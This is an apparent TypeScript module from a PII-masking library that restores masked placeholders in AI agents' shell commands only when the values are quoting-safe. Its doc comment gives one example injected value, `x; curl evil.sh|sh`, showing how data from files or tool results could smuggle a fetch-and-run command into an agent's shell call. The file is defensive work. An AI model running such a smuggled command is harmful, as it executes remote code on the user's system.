// SPDX-License-Identifier: Apache-2.0

import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'nullpii';

/**
 * Shell-aware restore for the tool calls whose input a shell runs.
 *
 * A masked value comes from data the model could not read: a file the
 * agent opened, a tool result. Put back verbatim into a shell command, it
 * can change what the command does. A "secret" that reads
 * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
 * command once restored. So in the `command` of a shell tool, each
 * placeholder gets its real value back only when that value is safe in
 * the quoting around the placeholder; otherwise it stays literal, and the
 * command works on the placeholder text, which is harmless.
 *
 * Same rule as the Claude Code mod (`quoteContextAt`, `shellSafe` in its
 * `hooks/policy.ts`), with one addition: a command substitution, `$(…)`
 * or backticks, opens a fresh unquoted context even inside double
 * quotes, where its content would otherwise pass for quoted text.
 *
 * Out of reach: a program that runs part of the command as code
 * (`bash -c`, `eval`, `ssh host …`, `python -c`). A value restored inside
 * its quoted argument is quoted for this shell, not for that program.
 */

/** Anthropic tools (by exact name) whose input a shell runs. */
export const ANTHROPIC_SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash']);

/** OpenAI-style agents also name their shell tool `bash` or `shell`. */
export const OPENAI_SHELL_TOOLS: ReadonlySet<string> = new Set(['Bash', 'bash', 'shell']);

/** The input field of a shell tool that the shell interprets. */
export const SHELL_COMMAND_FIELD = 'command';

export type QuoteContext = 'none' | 'single' | 'double';

/** What a value may contain to be put back where its placeholder stands:
 * it must not add commands, expand anything, or end its quotes. */
const SHELL_SAFE: Readonly<Record<QuoteContext, RegExp>> = {
  none: /^[A-Za-z0-9@%+=:,./_-]+$/,
  single: /^[^'\n]*$/,
  double: /^[^"$`\\!\n]*$/,
};

/** One level of shell nesting. `depth` counts the `(` opened inside a
 * `$(…)`, so its closing `)` is told apart from theirs. */
interface Frame {
  readonly kind: 'subst' | 'backtick' | 'single' | 'double';
  depth: number;
}

/** True when `name` is one of `shellTools`. */
export function isShellTool(name: unknown, shellTools: ReadonlySet<string>): boolean {
  return typeof name === 'string' && shellTools.has(name);
}

/** True when `value` can be put back as written in `context`. */
export function shellSafe(value: string, context: QuoteContext): boolean {
  return SHELL_SAFE[context].test(value);
}

/**
 * The quoting in force at `index` of a shell command. A small lexer:
 * single quotes, double quotes, backslash escapes outside single quotes,
 * and command substitutions (`$(…)`, backticks), whose content is
 * unquoted wherever they appear.
 */
export function quoteContextAt(command: string, index: number): QuoteContext {
  const stack: Frame[] = [];
  let i = 0;
  while (i < index) i += advance(stack, command, i);
  const kind = stack.at(-1)?.kind;
  if (kind === 'single' || kind === 'double') return kind;
  return 'none';
}

/** Read the token at `i`, update `stack`, return its length. */
function advance(stack: Frame[], command: string, i: number): number {
  const frame = stack.at(-1);
  const ch = command[i];
  if (frame?.kind === 'single') {
    if (ch === "'") stack.pop();
    return 1;
  }
  if (ch === '\\') return 2;
  if (ch === '$' && command[i + 1] === '(') {
    stack.push({ kind: 'subst', depth: 0 });
    return 2;
  }
  if (ch === '`') {
    if (frame?.kind === 'backtick') stack.pop();
    else stack.push({ kind: 'backtick', depth: 0 });
    return 1;
  }
  if (frame?.kind === 'double') {
    if (ch === '"') stack.pop();
    return 1;
  }
  // Unquoted: the top level, or inside a command substitution.
  if (ch === "'") stack.push({ kind: 'single', depth: 0 });
  else if (ch === '"') stack.push({ kind: 'double', depth: 0 });
  else if (frame?.kind === 'subst') closeSubstitution(stack, frame, ch);
  return 1;
}

function closeSubstitution(stack: Frame[], frame: Frame, ch: string | undefined): void {
  if (ch === '(') frame.depth += 1;
  if (ch !== ')') return;
  if (frame.depth === 0) stack.pop();
  else frame.depth -= 1;
}

/** A shell command with its safe placeholders restored. */
export interface ShellRestore {
  readonly command: string;
  /** One result per placeholder restored, or found unknown or foreign
   * (left literal, and counted as such by the caller). */
  readonly results: readonly RestoreResult[];
  /** Placeholders left literal because their value was not safe where
   * they stand. A count only, never the values. */
  readonly unsafe: number;
}

/**
 * Restore the placeholders in a shell `command`, each only when its real
 * value is safe in the quoting at its position. Contexts are read on the
 * command as received: a value restored there never opens or closes a
 * quote, so it cannot change the context of a later placeholder.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellCommand(
  np: RestoreCapable,
  command: string,
  sessionId: string,
): ShellRestore {
  const results: RestoreResult[] = [];
  let unsafe = 0;
  let out = '';
  let last = 0;
  for (const match of command.matchAll(placeholderPattern())) {
    const start = match.index;
    const placeholder = match[0];
    const r = np.restore(placeholder, sessionId);
    const safe = r.replacements === 0 || shellSafe(r.restored, quoteContextAt(command, start));
    if (safe) results.push(r);
    else unsafe += 1;
    out += command.slice(last, start) + (safe ? r.restored : placeholder);
    last = start + placeholder.length;
  }
  return { command: out + command.slice(last), results, unsafe };
}

/** How many placeholders `text` holds. */
export function countPlaceholders(text: string): number {
  return [...text.matchAll(placeholderPattern())].length;
}

/** A fresh global copy: `matchAll` needs the `g` flag, and a shared
 * global regex would carry `lastIndex` between callers. */
function placeholderPattern(): RegExp {
  return new RegExp(PLACEHOLDER_REGEX.source, 'g');
}
